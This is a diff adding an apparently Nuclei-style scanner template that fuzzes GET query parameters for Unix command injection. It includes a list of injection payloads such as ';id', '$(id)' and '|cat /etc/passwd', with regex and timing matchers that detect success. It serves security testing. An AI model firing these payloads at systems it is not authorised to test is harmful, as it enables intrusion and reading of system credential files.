@@ -1,0 +1,75 @@
+id: unix-command-injection
+
+info:
+  name: Unix Command Injection - Detection
+  author: pdteam
+  severity: high
+  description: |
+    Detects command injection vulnerabilities in Unix/Linux systems using various payload techniques.
+    Command injection allows execution of arbitrary commands on the host operating system via a vulnerable application.
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+  tags: dast,injection,rce,command-injection,unix,linux
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      unix_fuzz:
+        - ';id'
+        - '|id'
+        - '&id'
+        - '&&id'
+        - '`id`'
+        - '$(id)'
+        - ';whoami'
+        - '|whoami'
+        - '&&whoami'
+        - ';cat /etc/passwd'
+        - '|cat /etc/passwd'
+        - '&&cat /etc/passwd'
+        - ';ls -la'
+        - '|ls -la'
+        - '%0Aid'
+        - '%0Awhoami'
+        - '%0Acat%20/etc/passwd'
+        - ';sleep 5'
+        - '|sleep 5'
+        - '&&sleep 5'
+        - '`sleep 5`'
+
+    fuzzing:
+      - part: query
+        type: replace # replaces existing parameter value with fuzz payload
+        mode: multiple # replaces all parameters value with fuzz payload
+        fuzz:
+          - '{{unix_fuzz}}'
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: unix-id-output
+        part: body
+        regex:
+          - 'uid=\d+\([^)]+\)'
+
+      - type: regex
+        name: unix-passwd-content
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
+
+      - type: regex
+        name: unix-ls-output
+        part: body
+        regex:
+          - 'total \d+'
+
+      - type: dsl
+        name: time-based-unix
+        dsl:
+          - 'duration >= 4'
